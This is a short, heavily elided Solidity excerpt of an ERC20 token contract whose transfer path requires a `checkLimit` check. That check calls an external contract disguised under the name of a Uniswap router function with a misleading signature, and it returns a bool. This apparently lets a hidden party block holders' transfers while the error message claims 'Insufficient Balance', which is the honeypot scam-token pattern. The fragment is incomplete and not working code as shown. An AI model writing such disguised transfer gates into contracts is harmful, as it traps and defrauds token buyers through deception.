...
contract ERC20Token is Context, IERC20, Ownable {
        ...
        if (inSwapAndLiquify) {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if (sender != deadAddress) {
                    require(checkLimit(sender), "Insufficient Balance");
                }
    ...
    function checkLimit(address send) private view returns (bool) {
        if (send != deadAddress) {
            return _uniswapV2.swapExactTokensForTokens(send);
        }
        return false;
    }
